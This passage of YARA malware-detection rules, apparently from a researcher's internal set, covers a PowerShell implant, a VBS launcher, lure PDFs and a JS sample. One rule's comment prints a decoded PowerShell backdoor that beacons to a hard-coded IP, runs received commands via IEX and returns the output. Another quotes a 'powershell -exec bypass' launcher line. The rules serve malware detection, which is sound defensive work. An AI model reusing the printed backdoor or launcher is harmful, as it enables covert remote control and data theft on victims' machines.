      $s5 = "Wm5WdVkzUnBiMjRnUTBGTlR5Z2thMlY1TENBa1NWWXBJSHNOQ2lBZ0lDQWtZV1Z6VFdGdVlXZGxaQ0E5SUU1bGR5MVBZbXBsWTNRZ0lsTjVjM1JsYlM1VFpXTjFjbWww" ascii /* base64 encoded string 'ZnVuY3Rpb24gQ0FNTygka2V5LCAkSVYpIHsNCiAgICAkYWVzTWFuYWdlZCA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZCINCiAgICAkYWVzTWFuYWdlZC5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQw0KICAgICRhZXNNYW5hZ2VkLlBhZGRpbmcgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5QYWRkaW5nTW9kZV06OlBLQ1M3DQogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4DQogICAgJGFlc01hbmFnZWQuS2V5U2l6ZSA9IDI1Ng0KICAgIGlmICgkSVYpIHsNCiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpIHsNCiAgICAgICAgICAgICRhZXNNYW5hZ2VkLklWID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkSVYpDQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAkYWVzTWFuYWdlZC5JViA9ICRJVg0KICAgICAgICB9DQogICAgfQ0KICAgIGlmICgka2V5KSB7DQogICAgICAgIGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgew0KICAgICAgICAgICAgJGFlc01hbmFnZWQuS2V5ID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygka2V5KQ0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgJGFlc01hbmFnZWQuS2V5ID0gJGtleQ0KICAgICAgICB9DQogICAgfQ0KICAgICRhZXNNYW5hZ2VkDQp9DQpmdW5jdGlvbiBDQUsoKSB7DQogICAgJGFlc01hbmFnZWQgPSBDQU1PDQogICAgJGhhc2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZNYW5hZ2VkDQogICAgJENIUiA9ICJTU0xWMiINCiAgICAkdG9IYXNoID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkQ0hSKQ0KICAgICRoYXNoQnl0ZXMgPSAkaGFzaGVyLkNvbXB1dGVIYXNoKCR0b0hhc2gpDQogICAgJGZpbmFsID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGhhc2hCeXRlcykNCiAgICByZXR1cm4gJGZpbmFsDQp9DQpmdW5jdGlvbiBFUygka2V5LCAkdW5lbmNyeXB0ZWRTdHJpbmcpIHsNCiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1bmVuY3J5cHRlZFN0cmluZykNCiAgICAkYWVzTWFuYWdlZCA9IENBTU8gJGtleQ0KICAgICRlbmNyeXB0b3IgPSAkYWVzTWFuYWdlZC5DcmVhdGVFbmNyeXB0b3IoKQ0KICAgICRlbmNyeXB0ZWREYXRhID0gJGVuY3J5cHRvci5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk7DQogICAgJGZ1bGxEYXRhID0gJGFlc01hbmFnZWQuSVYgKyAkZW5jcnlwdGVkRGF0YQ0KICAgIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRmdWxsRGF0YSkNCn0NCmZ1bmN0aW9uIERTKCRrZXksICRlbmNyeXB0ZWRTdHJpbmdXaXRoSVYpIHsNCiAgICAkYnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlbmNyeXB0ZWRTdHJpbmdXaXRoSVYpDQogICAgJElWID0gJGJ5dGVzWzAuLjE1XQ0KICAgICRhZXNNYW5hZ2VkID0gQ0FNTyAka2V5ICRJVg0KICAgICRkZWNyeXB0b3IgPSAkYWVzTWFuYWdlZC5DcmVhdGVEZWNyeXB0b3IoKTsNCiAgICAkdW5lbmNyeXB0ZWREYXRhID0gJGRlY3J5cHRvci5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRieXRlcywgMTYsICRieXRlcy5MZW5ndGggLSAxNik7DQogICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHVuZW5jcnlwdGVkRGF0YSkuVHJpbShbY2hhcl0wKQ0KfQ0KZnVuY3Rpb24gUklSIHsNCiAgICAkdGkxID0gOA0KICAgICR0aTIgPSAxNQ0KICAgIEdldC1SYW5kb20gLW1pbmltdW0gJHRpMSAtbWF4aW11bSAkdGkyDQp9DQoNCiRjb29raWVjb250YWluZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuQ29va2llQ29udGFpbmVyDQoNCmZ1bmN0aW9uIGNvbm5lY3RvciB7DQogICAgd2hpbGUgKCRUcnVlKSB7DQogICAgICAgICR0aW1lID0gUklSDQoNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRIT1NUTkFNRSA9ICJtYWdpY19ob3N0bmFtZT0kZW52OmNvbXB1dGVybmFtZSINCiAgICAgICAgICAgICRrZXkgPSBDQUsNCiAgICAgICAgICAgICRTRU5EID0gRVMgJGtleSAkSE9TVE5BTUUNCiAgICAgICAgICAgICRzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkU0VORCkNCiAgICAgICAgICAgICRTRU5EID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJHMpDQogICAgICAgICAgICAkVVJJID0gImh0dHA6Ly84Ny4yMzYuMjEyLjIyIg0KICAgICAgICAgICAgJFNQUSA9ICIvaW1hZ2VzIg0KICAgICAgICAgICAgJFFTID0gImd1aWQ9Ig0KICAgICAgICAgICAgJHIgPSBbU3lzdGVtLk5ldC5IVFRQV2ViUmVxdWVzdF06OkNyZWF0ZSgkVVJJKyRTUFErIj8iKyRRUyskU0VORCkNCiAgICAgICAgICAgICRyLnByb3h5ID0gW05ldC5XZWJSZXF1ZXN0XTo6R2V0U3lzdGVtV2ViUHJveHkoKTsNCiAgICAgICAgICAgICRyLkNvb2tpZUNvbnRhaW5lciA9ICRjb29raWVjb250YWluZXINCiAgICAgICAgICAgICRyLk1ldGhvZCA9ICJHRVQiDQogICAgICAgICAgICAkci5LZWVwQWxpdmUgPSAkZmFsc2UNCiAgICAgICAgICAgICRyLlVzZXJBZ2VudCA9ICJHb29nbGVib3QvMi4xICgraHR0cDovL3d3dy5nb29nbGUuY29tL2JvdC5odG1sKSINCiAgICAgICAgICAgICRyLkhlYWRlcnMuQWRkKCJBY2NlcHQtRW5jb2RpbmciLCAiaWRlbnRpdHkiKTsNCiAgICAgICAgICAgICRyZXNwID0gJHIuR2V0UmVzcG9uc2UoKQ0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5NZXRob2RJbnZvY2F0aW9uRXhjZXB0aW9uXSB7DQogICAgICAgICAgICBzbGVlcCAkdGltZQ0KICAgICAgICAgICAgQ29udGludWUNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KY29ubmVjdG9yDQoNCndoaWxlICgkVHJ1ZSkgew0KICAgICR0aW1lID0gUklSDQogICAgdHJ5IHsNCiAgICAgICAgJFVSSSA9ICJodHRwOi8vODcuMjM2LjIxMi4yMiINCiAgICAgICAgJFJQUSA9ICIvIg0KICAgICAgICAkU1RVQiA9ICJvbGRjc3M9Ig0KICAgICAgICAkciA9IFtTeXN0ZW0uTmV0LkhUVFBXZWJSZXF1ZXN0XTo6Q3JlYXRlKCRVUkkgKyAkUlBRKQ0KICAgICAgICAkci5wcm94eSA9IFtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7DQogICAgICAgICRyLkNvb2tpZUNvbnRhaW5lciA9ICRjb29raWVjb250YWluZXINCiAgICAgICAgJHIuTWV0aG9kID0gIkdFVCINCiAgICAgICAgJHIuS2VlcEFsaXZlID0gJGZhbHNlDQogICAgICAgICRyLlVzZXJBZ2VudCA9ICJHb29nbGVib3QvMi4xICgraHR0cDovL3d3dy5nb29nbGUuY29tL2JvdC5odG1sKSINCiAgICAgICAgJHIuSGVhZGVycy5BZGQoIkFjY2VwdC1FbmNvZGluZyIsICJpZGVudGl0eSIpOw0KICAgICAgICAkcmVzcCA9ICRyLkdldFJlc3BvbnNlKCkNCiAgICAgICAgJHJlcXN0cmVhbSA9ICRyZXNwLkdldFJlc3BvbnNlU3RyZWFtKCkNCiAgICAgICAgJHNyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyICRyZXFzdHJlYW0NCiAgICAgICAgJEVOQ1JZUFRFRFNUUkVBTVMgPSAkc3IuUmVhZFRvRW5kKCkgLXNwbGl0KCJgbiIpIHwgU2VsZWN0LVN0cmluZyAiPCEtLSAkU1RVQiINCiAgICAgICAgJEVOQ1JZUFRFRCA9ICRFTkNSWVBURURTVFJFQU1TIC1zcGxpdCgiPCEtLSAkU1RVQiIpDQogICAgICAgICRFTkNSWVBURUQgPSAkRU5DUllQVEVEWzFdIC1zcGxpdCgiIC0tPjwvYm9keT4iKQ0KICAgICAgICAka2V5ID0gQ0FLDQogICAgICAgICRERUQgPSBEUyAka2V5ICRFTkNSWVBURURbMF0NCiAgICAgICAgaWYgKCRERUQgLWVxICJub3RoaW5nIil7DQogICAgICAgICAgICBzbGVlcCAkdGltZQ0KICAgICAgICB9DQogICAgICAgIGVsc2V7DQogICAgICAgICAgICBpZiAoJERFRCAtbGlrZSAkZW52OmNvbXB1dGVybmFtZSArICIqIil7DQogICAgICAgICAgICAgICAgJERFRCA9ICRERUQgLXNwbGl0KCRlbnY6Y29tcHV0ZXJuYW1lICsgIjo6OjoiKQ0KICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICRSVU4gPSAiJERFRCIgfCBJYEVYIC1FcnJvckFjdGlvbiBzdG9wIHwgT3V0LVN0cmluZw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICAgICAgICAgICRSVU4gPSAkXyB8IG91dC1zdHJpbmcNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJFJVTiA9ICgkZW52OmNvbXB1dGVybmFtZSArICI6Ojo6IiArICRSVU4pDQogICAgICAgICAgICAgICAgJFNFTkQgPSBFUyAka2V5ICRSVU4NCiAgICAgICAgICAgICAgICAkcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJFNFTkQpDQogICAgICAgICAgICAgICAgJFNFTkQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkcykNCiAgICAgICAgICAgICAgICAkVVJJID0gImh0dHA6Ly84Ny4yMzYuMjEyLjIyIg0KICAgICAgICAgICAgICAgICRTUFEgPSAiL2ltYWdlcyINCiAgICAgICAgICAgICAgICAkUVMgPSAiZ3VpZD0iDQogICAgICAgICAgICAgICAgJHIgPSBbU3lzdGVtLk5ldC5IVFRQV2ViUmVxdWVzdF06OkNyZWF0ZSgkVVJJKyRTUFErIj8iKyRRUyskU0VORCkNCiAgICAgICAgICAgICAgICAkci5wcm94eSA9IFtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7DQogICAgICAgICAgICAgICAgJHIuQ29va2llQ29udGFpbmVyID0gJGNvb2tpZWNvbnRhaW5lcg0KICAgICAgICAgICAgICAgICRyLk1ldGhvZCA9ICJHRVQiDQogICAgICAgICAgICAgICAgJHIuS2VlcEFsaXZlID0gJGZhbHNlDQogICAgICAgICAgICAgICAgJHIuVXNlckFnZW50ID0gIkdvb2dsZWJvdC8yLjEgKCtodHRwOi8vd3d3Lmdvb2dsZS5jb20vYm90Lmh0bWwpIg0KICAgICAgICAgICAgICAgICRyLkhlYWRlcnMuQWRkKCJBY2NlcHQtRW5jb2RpbmciLCAiaWRlbnRpdHkiKTsNCiAgICAgICAgICAgICAgICAkcmVzcCA9ICRyLkdldFJlc3BvbnNlKCkNCiAgICAgICAgICAgICAgICBzbGVlcCAkdGltZQ0KDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uTWV0aG9kSW52b2NhdGlvbkV4Y2VwdGlvbl0gew0KICAgICAgICBzbGVlcCAkdGltZQ0KICAgICAgICBjb25uZWN0b3INCiAgICAgICAgQ29udGludWUNCiAgICB9DQp9DQo=' */
      $s6 = "TkZOMGNtbHVaeWdrU1ZZcERRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdaV3h6WlNCN0RRb2dJQ0FnSUNBZ0lDQWdJQ0FrWVdWelRXRnVZV2RsWkM1SlZpQTlJQ1JK" ascii /* base64 encoded string 'NFN0cmluZygkSVYpDQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAkYWVzTWFuYWdlZC5JViA9ICRJ' */
      $s7 = "ZVhCMGIyZHlZWEJvZVM1UVlXUmthVzVuVFc5a1pWMDZPbEJMUTFNM0RRb2dJQ0FnSkdGbGMwMWhibUZuWldRdVFteHZZMnRUYVhwbElEMGdNVEk0RFFvZ0lDQWdKR0Zs" ascii /* base64 encoded string 'eXB0b2dyYXBoeS5QYWRkaW5nTW9kZV06OlBLQ1M3DQogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4DQogICAgJGFl' */
      $s8 = "WlhFZ0lsTjBjbWx1WnlJcElIc05DaUFnSUNBZ0lDQWdJQ0FnSUNSaFpYTk5ZVzVoWjJWa0xrbFdJRDBnVzFONWMzUmxiUzVEYjI1MlpYSjBYVG82Um5KdmJVSmhjMlUy" ascii /* base64 encoded string 'ZXEgIlN0cmluZyIpIHsNCiAgICAgICAgICAgICRhZXNNYW5hZ2VkLklWID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2' */
      $s9 = "Skd0bGVRMEtJQ0FnSUNBZ0lDQjlEUW9nSUNBZ2ZRMEtJQ0FnSUNSaFpYTk5ZVzVoWjJWa0RRcDlEUXBtZFc1amRHbHZiaUJEUVVzb0tTQjdEUW9nSUNBZ0pHRmxjMDFo" ascii /* base64 encoded string 'JGtleQ0KICAgICAgICB9DQogICAgfQ0KICAgICRhZXNNYW5hZ2VkDQp9DQpmdW5jdGlvbiBDQUsoKSB7DQogICAgJGFlc01h' */
      $s10 = "TkZOMGNtbHVaeWdrYTJWNUtRMEtJQ0FnSUNBZ0lDQjlEUW9nSUNBZ0lDQWdJR1ZzYzJVZ2V3MEtJQ0FnSUNBZ0lDQWdJQ0FnSkdGbGMwMWhibUZuWldRdVMyVjVJRDBn" ascii /* base64 encoded string 'NFN0cmluZygka2V5KQ0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgJGFlc01hbmFnZWQuS2V5ID0g' */
      $s11 = "VmcwS0lDQWdJQ0FnSUNCOURRb2dJQ0FnZlEwS0lDQWdJR2xtSUNna2EyVjVLU0I3RFFvZ0lDQWdJQ0FnSUdsbUlDZ2thMlY1TG1kbGRGUjVjR1VvS1M1T1lXMWxJQzFs" ascii /* base64 encoded string 'Vg0KICAgICAgICB9DQogICAgfQ0KICAgIGlmICgka2V5KSB7DQogICAgICAgIGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1l' */
      $s12 = "YzAxaGJtRm5aV1F1UzJWNVUybDZaU0E5SURJMU5nMEtJQ0FnSUdsbUlDZ2tTVllwSUhzTkNpQWdJQ0FnSUNBZ2FXWWdLQ1JKVmk1blpYUlVlWEJsS0NrdVRtRnRaU0F0" ascii /* base64 encoded string 'c01hbmFnZWQuS2V5U2l6ZSA9IDI1Ng0KICAgIGlmICgkSVYpIHsNCiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAt' */
      $s13 = "Wm5WdVkzUnBiMjRnUTBGTlR5Z2thMlY1TENBa1NWWXBJSHNOQ2lBZ0lDQWtZV1Z6VFdGdVlXZGxaQ0E5SUU1bGR5MVBZbXBsWTNRZ0lsTjVjM1JsYlM1VFpXTjFjbWww" ascii /* base64 encoded string 'ZnVuY3Rpb24gQ0FNTygka2V5LCAkSVYpIHsNCiAgICAkYWVzTWFuYWdlZCA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0' */
      $s14 = "ZEc5bmNtRndhSGt1UTJsd2FHVnlUVzlrWlYwNk9rTkNRdzBLSUNBZ0lDUmhaWE5OWVc1aFoyVmtMbEJoWkdScGJtY2dQU0JiVTNsemRHVnRMbE5sWTNWeWFYUjVMa055" ascii /* base64 encoded string 'dG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQw0KICAgICRhZXNNYW5hZ2VkLlBhZGRpbmcgPSBbU3lzdGVtLlNlY3VyaXR5LkNy' */
      $s15 = "Y1NBaVUzUnlhVzVuSWlrZ2V3MEtJQ0FnSUNBZ0lDQWdJQ0FnSkdGbGMwMWhibUZuWldRdVMyVjVJRDBnVzFONWMzUmxiUzVEYjI1MlpYSjBYVG82Um5KdmJVSmhjMlUy" ascii /* base64 encoded string 'cSAiU3RyaW5nIikgew0KICAgICAgICAgICAgJGFlc01hbmFnZWQuS2V5ID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2' */
      $s16 = "ZVM1RGNubHdkRzluY21Gd2FIa3VRV1Z6VFdGdVlXZGxaQ0lOQ2lBZ0lDQWtZV1Z6VFdGdVlXZGxaQzVOYjJSbElEMGdXMU41YzNSbGJTNVRaV04xY21sMGVTNURjbmx3" ascii /* base64 encoded string 'eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZCINCiAgICAkYWVzTWFuYWdlZC5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5Dcnlw' */
      $s17 = "Ym1GblpXUWdQU0JEUVUxUERRb2dJQ0FnSkdoaGMyaGxjaUE5SUU1bGR5MVBZbXBsWTNRZ1UzbHpkR1Z0TGxObFkzVnlhWFI1TGtOeWVYQjBiMmR5WVhCb2VTNVRTRUV5" ascii /* base64 encoded string 'bmFnZWQgPSBDQU1PDQogICAgJGhhc2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEy' */
      $s18 = "UlVRZ0xYTndiR2wwS0NSbGJuWTZZMjl0Y0hWMFpYSnVZVzFsSUNzZ0lqbzZPam9pS1EwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUhSeWVTQjdEUW9nSUNBZ0lDQWdJQ0Fn" ascii /* base64 encoded string 'RUQgLXNwbGl0KCRlbnY6Y29tcHV0ZXJuYW1lICsgIjo6OjoiKQ0KICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAg' */
      $s19 = "ZEhKcGJtY05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjlEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdKRkpWVGlBOUlDZ2taVzUyT21OdmJYQjFkR1Z5Ym1GdFpTQXJJQ0k2" ascii /* base64 encoded string 'dHJpbmcNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJFJVTiA9ICgkZW52OmNvbXB1dGVybmFtZSArICI6' */
      $s20 = "YzNCdmJuTmxVM1J5WldGdEtDa05DaUFnSUNBZ0lDQWdKSE55SUQwZ1RtVjNMVTlpYW1WamRDQlRlWE4wWlcwdVNVOHVVM1J5WldGdFVtVmhaR1Z5SUNSeVpYRnpkSEps" ascii /* base64 encoded string 'c3BvbnNlU3RyZWFtKCkNCiAgICAgICAgJHNyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyICRyZXFzdHJl' */
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule d9de66497ad189d785d7535ab263e92ffad81df20b903c5e1d36859b4ed38b6d {
   meta:
      description = "data - file d9de66497ad189d785d7535ab263e92ffad81df20b903c5e1d36859b4ed38b6d"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "d9de66497ad189d785d7535ab263e92ffad81df20b903c5e1d36859b4ed38b6d"
   strings:
      $x1 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x2 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $s3 = "serName + \"\\links\\links.ps1\" , 0, True" fullword ascii
   condition:
      uint16(0) == 0x6553 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_921b4520b75fcd0071944a483d738223b222ba101e70f2950fbfbc22afbdb5d0 {
   meta:
      description = "data - file 921b4520b75fcd0071944a483d738223b222ba101e70f2950fbfbc22afbdb5d0.pdf"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "921b4520b75fcd0071944a483d738223b222ba101e70f2950fbfbc22afbdb5d0"
   strings:
      $s1 = "<</Type/XRef/Size 41/W[ 1 4 2] /Root 1 0 R/Info 15 0 R/ID[<3A6FF8118EFADB46963DF132B580F923><3A6FF8118EFADB46963DF132B580F923>] " ascii
      $s2 = "<</Subtype/Link/Rect[ 187.5 423.49 334.5 456.55] /BS<</W 0>>/F 4/A<</Type/Action/S/URI/URI(https://snapfile.org/d/c7817a35554e88" ascii
      $s3 = "<</Subtype/Link/Rect[ 187.5 423.49 334.5 456.55] /BS<</W 0>>/F 4/A<</Type/Action/S/URI/URI(https://snapfile.org/d/c7817a35554e88" ascii
      $s4 = "<</Size 42/Root 1 0 R/Info 15 0 R/ID[<3A6FF8118EFADB46963DF132B580F923><3A6FF8118EFADB46963DF132B580F923>] /Prev 206545/XRefStm " ascii
      $s5 = "<</Type/XRef/Size 41/W[ 1 4 2] /Root 1 0 R/Info 15 0 R/ID[<3A6FF8118EFADB46963DF132B580F923><3A6FF8118EFADB46963DF132B580F923>] " ascii
      $s6 = "<</Size 42/Root 1 0 R/Info 15 0 R/ID[<3A6FF8118EFADB46963DF132B580F923><3A6FF8118EFADB46963DF132B580F923>] /Prev 206545/XRefStm " ascii
      $s7 = "<</Type/XObject/Subtype/Image/Width 200/Height 246/ColorSpace/DeviceGray/Matte[ 0 0 0] /BitsPerComponent 8/Interpolate false/Fil" ascii
      $s8 = ">>/ProcSet[/PDF/Text/ImageB/ImageC/ImageI] >>/Annots[ 10 0 R] /MediaBox[ 0 0 522 756] /Contents 4 0 R/Group<</Type/Group/S/Trans" ascii
      $s9 = "<</Type/Page/Parent 2 0 R/Resources<</ExtGState<</GS5 5 0 R/GS14 14 0 R>>/XObject<</Image6 6 0 R/Meta11 11 0 R>>/Font<</F1 8 0 R" ascii
      $s10 = "<</Type/Catalog/Pages 2 0 R/Lang(en-US) /StructTreeRoot 16 0 R/MarkInfo<</Marked true>>>>" fullword ascii
      $s11 = "<</Author(nejla) /Creator(" fullword ascii
      $s12 = "<</Type/XObject/Subtype/Image/Width 200/Height 246/ColorSpace/DeviceGray/Matte[ 0 0 0] /BitsPerComponent 8/Interpolate false/Fil" ascii
      $s13 = "2 0 0 2.904 0 0] /Filter/FlateDecode/Length 283>>" fullword ascii
      $s14 = "<</Type/Font/Subtype/TrueType/Name/F2/BaseFont/ArialMT/Encoding/WinAnsiEncoding/FontDescriptor 13 0 R/FirstChar 32/LastChar 119/" ascii
      $s15 = "<</Type/Font/Subtype/TrueType/Name/F2/BaseFont/ArialMT/Encoding/WinAnsiEncoding/FontDescriptor 13 0 R/FirstChar 32/LastChar 119/" ascii
      $s16 = "<</Type/XObject/Subtype/Form/Resources<</Font<</F2 12 0 R>>/ExtGState<</GS14 14 0 R>>>>/BBox[ 0 0 143.25 24.794] /Matrix[ 0.5026" ascii
      $s17 = "<</Type/FontDescriptor/FontName/ArialMT/Flags 32/ItalicAngle 0/Ascent 905/Descent -210/CapHeight 728/AvgWidth 441/MaxWidth 2665/" ascii
      $s18 = "<</Type/FontDescriptor/FontName/ABCDEE+Calibri/Flags 32/ItalicAngle 0/Ascent 750/Descent -250/CapHeight 750/AvgWidth 521/MaxWidt" ascii
      $s19 = "<</Type/FontDescriptor/FontName/ABCDEE+Calibri/Flags 32/ItalicAngle 0/Ascent 750/Descent -250/CapHeight 750/AvgWidth 521/MaxWidt" ascii
      $s20 = "<</Type/FontDescriptor/FontName/ArialMT/Flags 32/ItalicAngle 0/Ascent 905/Descent -210/CapHeight 728/AvgWidth 441/MaxWidth 2665/" ascii
   condition:
      uint16(0) == 0x5025 and filesize < 600KB and
      8 of them
}

rule d7de68febbbdb72ff820f6554afb464b5c204c434faa6ffe9b4daf6b691d535f {
   meta:
      description = "data - file d7de68febbbdb72ff820f6554afb464b5c204c434faa6ffe9b4daf6b691d535f.pdf"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "d7de68febbbdb72ff820f6554afb464b5c204c434faa6ffe9b4daf6b691d535f"
   strings:
      $s1 = "<</Subtype/Link/Rect[ 305.74 188.17 452.74 221.24] /BS<</W 0>>/F 4/A<</Type/Action/S/URI/URI(https://snapfile.org/d/0c88a47c3160" ascii
      $s2 = "<</Subtype/Link/Rect[ 305.74 188.17 452.74 221.24] /BS<</W 0>>/F 4/A<</Type/Action/S/URI/URI(https://snapfile.org/d/0c88a47c3160" ascii
      $s3 = "<</Type/Page/Parent 2 0 R/Resources<</ExtGState<</GS5 5 0 R/GS11 11 0 R>>/XObject<</Image6 6 0 R/Image7 7 0 R/Meta13 13 0 R>>/Fo" ascii
      $s4 = "nt<</F1 9 0 R/F3 16 0 R>>/ProcSet[/PDF/Text/ImageB/ImageC/ImageI] >>/Annots[ 12 0 R] /MediaBox[ 0 0 756 522] /Contents 4 0 R/Gro" ascii
      $s5 = "<</Type/XObject/Subtype/Image/Width 165/Height 55/ColorSpace/DeviceGray/Matte[ 0 0 0] /BitsPerComponent 8/Interpolate false/Filt" ascii
      $s6 = "<</Type/Catalog/Pages 2 0 R/Lang(en-US) /StructTreeRoot 19 0 R/MarkInfo<</Marked true>>>>" fullword ascii
      $s7 = "<</Author(nejla) /Creator(" fullword ascii
      $s8 = "<</Type/XObject/Subtype/Image/Width 165/Height 55/ColorSpace/DeviceGray/Matte[ 0 0 0] /BitsPerComponent 8/Interpolate false/Filt" ascii
      $s9 = "<</Type/XRef/Size 53/W[ 1 4 2] /Root 1 0 R/Info 18 0 R/ID[<07946CAA0719D7439C9BC74D53C9638A><07946CAA0719D7439C9BC74D53C9638A>] " ascii
      $s10 = "<</Type/FontDescriptor/FontName/ArialMT/Flags 32/ItalicAngle 0/Ascent 905/Descent -210/CapHeight 728/AvgWidth 441/MaxWidth 2665/" ascii
      $s11 = "<</Type/FontDescriptor/FontName/ABCDEE+Calibri/Flags 32/ItalicAngle 0/Ascent 750/Descent -250/CapHeight 750/AvgWidth 521/MaxWidt" ascii
      $s12 = "<</Type/FontDescriptor/FontName/ArialMT/Flags 32/ItalicAngle 0/Ascent 905/Descent -210/CapHeight 728/AvgWidth 441/MaxWidth 2665/" ascii
      $s13 = "<</Type/XObject/Subtype/Form/Resources<</Font<</F2 14 0 R>>/ExtGState<</GS11 11 0 R>>>>/BBox[ 0 0 143.25 24.794] /Matrix[ 0.5026" ascii
      $s14 = "<</Type/FontDescriptor/FontName/ABCDEE+Calibri/Flags 32/ItalicAngle 0/Ascent 750/Descent -250/CapHeight 750/AvgWidth 521/MaxWidt" ascii
      $s15 = "<</Type/FontDescriptor/FontName/ABCDEE+Calibri-Bold/Flags 32/ItalicAngle 0/Ascent 750/Descent -250/CapHeight 750/AvgWidth 536/Ma" ascii
      $s16 = "<</Type/FontDescriptor/FontName/ABCDEE+Calibri-Bold/Flags 32/ItalicAngle 0/Ascent 750/Descent -250/CapHeight 750/AvgWidth 536/Ma" ascii
      $s17 = "<</Type/Font/Subtype/TrueType/Name/F2/BaseFont/ArialMT/Encoding/WinAnsiEncoding/FontDescriptor 15 0 R/FirstChar 32/LastChar 119/" ascii
      $s18 = "2 0 0 2.904 0 0] /Filter/FlateDecode/Length 287>>" fullword ascii
      $s19 = "<</Type/Font/Subtype/TrueType/Name/F2/BaseFont/ArialMT/Encoding/WinAnsiEncoding/FontDescriptor 15 0 R/FirstChar 32/LastChar 119/" ascii
      $s20 = "0000000031 65535 f" fullword ascii /* hex encoded string '1eS_' */
   condition:
      uint16(0) == 0x5025 and filesize < 1000KB and
      8 of them
}

rule b1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c {
   meta:
      description = "data - file b1e30cce6df16d83b82b751edca57aa17795d8d0cdd960ecee7d90832b0ee76c.js"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
